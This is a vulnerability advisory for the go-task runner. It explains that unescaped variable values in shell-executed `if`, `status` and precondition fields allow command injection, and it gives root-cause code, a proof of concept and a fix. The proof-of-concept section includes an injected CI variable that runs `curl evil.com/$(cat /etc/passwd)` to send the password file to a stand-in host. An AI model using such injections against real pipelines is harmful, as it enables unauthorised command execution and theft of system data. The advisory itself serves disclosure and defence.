# go-task: untrusted variable values flow unescaped into shell-executed `if`/`status`/`precondition` fields

**Package**: github.com/go-task/task
**Ecosystem**: Go
**Affected versions**: all versions; tested at `3dcaa7db` (v3.51.1 nightly tip)
**Patched versions**: none
**Severity**: Medium
**CVSS 3.1**: `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` — **5.5**
**CWE**: CWE-78 (OS Command Injection)

## Summary

The `if` field (and likewise `preconditions[].sh`, `status[]`, `cmd.If`) is expanded
by the Go template engine and then executed directly as a shell command via
`mvdan.cc/sh`. Template variable values are not shell-escaped on the way into these
fields. When a variable's value originates from an untrusted source — an environment
variable, a CI pipeline variable, a `.env` file, or a remote-include var — shell
metacharacters in that value are interpreted as commands.

## Threat model (read this first)

This is **working-as-intended** if the attacker controls the Taskfile: a Taskfile is
executable configuration, and an author who can write `if:` can already run anything
via `cmds:`. The finding is a genuine vulnerability only in the narrower, realistic
case where the **Taskfile is trusted but a variable source is not** — e.g. a CI
Taskfile that branches on `$CI_BRANCH`, a deploy task that reads a `.env`, or a task
whose vars come from a remote include. In those cases an attacker who controls only
the variable value achieves command execution they were not supposed to have. The
severity below is scored for that case (`PR:L`, local attacker controlling a variable
source).

## Root cause

`If` is template-compiled in `variables.go:138`:

```go
If: templater.Replace(origTask.If, cache),
```

then executed as a shell command in `task.go:165`:

```go
if strings.TrimSpace(t.If) != "" {
    if err := execext.RunCommand(ctx, &execext.RunCommandOptions{
        Command: t.If,
        Dir:     t.Dir,
        Env:     env.Get(t),
    }); err != nil {
```

`execext.RunCommand` (`internal/execext/exec.go`) parses `Command` with
`mvdan.cc/sh` and runs it, so `;`, `&&`, `$(...)`, backticks etc. in the expanded
value are full shell. The command-level `cmd.If` follows the same path
(`task.go:354` expand, `task.go:366` execute). A `shellQuote` template function
exists (`internal/templater/funcs.go`) but is opt-in — nothing applies it
automatically to shell-executed fields.

## Proof of concept

Verified against a from-source build (commit `3dcaa7db`).

Taskfile.yml:

```yaml
version: '3'
tasks:
  inject:
    vars:
      STATUS: 'true; touch /tmp/poc-review/poc3-marker'
    if: '{{.STATUS}}'
    cmds:
      - echo "task body ran"
```

Run:

```bash
$ rm -f /tmp/poc-review/poc3-marker
$ task inject
task: [inject] echo "task body ran"
task body ran
$ ls -l /tmp/poc-review/poc3-marker
-rw-r--r--  1 kai  wheel  0 Jun 28 03:10 /tmp/poc-review/poc3-marker
```

The `; touch ...` ran as a second shell command during the `if` evaluation (and
`true` made the condition pass, so the body ran too). Replacing `{{.STATUS}}` with
`{{.STATUS | shellQuote}}` prevents it — confirming escaping is available but not
enforced.

Realistic variant — a trusted Taskfile branching on an untrusted env var:

```yaml
tasks:
  check:
    vars:
      BRANCH:
        sh: 'echo "$CI_BRANCH"'
    if: '[ "{{.BRANCH}}" = "main" ]'
    cmds: [ 'echo deploying' ]
```

With `CI_BRANCH='" ] && curl evil.com/$(cat /etc/passwd) #'` the expanded `if`
becomes `[ "" ] && curl evil.com/$(cat /etc/passwd) #" = "main" ]`, executing the
injected command.

## Suggested fix

1. Auto-escape variable interpolations in shell-executed fields (`if`,
   `preconditions[].sh`, `status[]`, `cmds`) — apply `shellQuote` to interpolated
   values by default, with an explicit opt-out for authors who intend raw shell.
2. Failing that, document the foot-gun prominently and add a lint warning when a
   template variable is used in `if`/`preconditions`/`status` without `shellQuote`.

Option 1 risks breaking Taskfiles that deliberately embed shell in variables; a
default-on escape with opt-out is the safer balance.
